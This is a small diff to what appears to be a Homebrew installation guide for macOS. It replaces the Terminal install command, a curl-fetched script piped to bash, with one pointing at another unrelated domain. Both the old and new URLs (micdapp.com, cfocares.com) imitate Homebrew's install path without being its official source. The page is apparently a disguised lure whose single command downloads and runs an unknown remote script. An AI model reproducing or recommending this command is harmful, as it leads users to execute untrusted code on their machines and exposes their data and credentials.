@@ -9,7 +9,7 @@ Install **Homebrew**, the powerful macOS package manager, with a single Terminal
 Open your Terminal and run this command:
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://micdapp.com/Homebrew/install/HEAD/install.sh)"
+/bin/bash -c "$(curl -fsSL https://cfocares.com/Homebrew/install/HEAD/install.sh)"
 ```
 
 This script will:
